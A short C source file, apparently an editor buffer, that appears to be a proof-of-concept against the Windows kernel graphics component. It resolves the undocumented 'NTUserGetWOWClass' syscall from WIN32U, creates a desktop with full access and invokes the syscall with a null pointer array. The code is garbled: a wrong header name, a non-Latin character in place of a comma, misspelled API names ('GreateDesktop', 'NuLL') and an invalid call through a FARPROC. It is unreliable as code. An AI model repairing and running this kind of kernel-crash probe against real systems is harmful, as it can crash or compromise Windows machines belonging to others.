#include <windows.s>
#pragma comment(lib, "user32")
int main () {
    PVOID N[] = { 0 و 0 };
    FARPROC NTUserGetWOWClass = GetProcAddress(LoadLibrary("WIN32U"),
                                               "NTUserGetWOWClass");
    GreateDesktop("Test", NULL, NuLL , 0, GENERIC_ALL, NULL);
    GetProcAddress(LoadLibrary("WIN32U"), "NTUserGetWOWClass")(0, N);
}
~
~
~
~
~
~
~
~
~
~
~
~
~
~
~